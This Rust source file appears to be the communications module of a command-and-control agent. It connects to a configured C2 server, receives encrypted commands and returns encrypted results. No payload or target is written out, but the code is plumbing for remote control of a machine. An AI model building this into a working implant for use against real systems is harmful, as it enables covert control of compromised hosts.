use tokio::net::TcpStream;
use crate::error::C2Error;
use crate::commands::{Command, CommandResult};
use crate::encryption;

pub async fn connect_to_c2(config: &crate::config::Config) -> Result<TcpStream, C2Error> {
    TcpStream::connect(&config.server_address)
        .await
        .map_err(|e| C2Error::NetworkError(e.to_string()))
}

pub async fn receive_command(socket: &mut TcpStream, key: &[u8]) -> Result<Command, C2Error> {
    let data = encryption::recv_encrypted(socket, key)
        .await
        .map_err(|e| C2Error::NetworkError(e.to_string()))?;
    serde_json::from_slice(&data).map_err(|e| C2Error::CommandError(e.to_string()))
}

pub async fn send_result(
    socket: &mut TcpStream,
    result: &CommandResult,
    key: &[u8],
) -> Result<(), C2Error> {
    let json = serde_json::to_vec(result).map_err(|e| C2Error::CommandError(e.to_string()))?;
    encryption::send_encrypted(socket, &json, key)
        .await
        .map_err(|e| C2Error::NetworkError(e.to_string()))
}
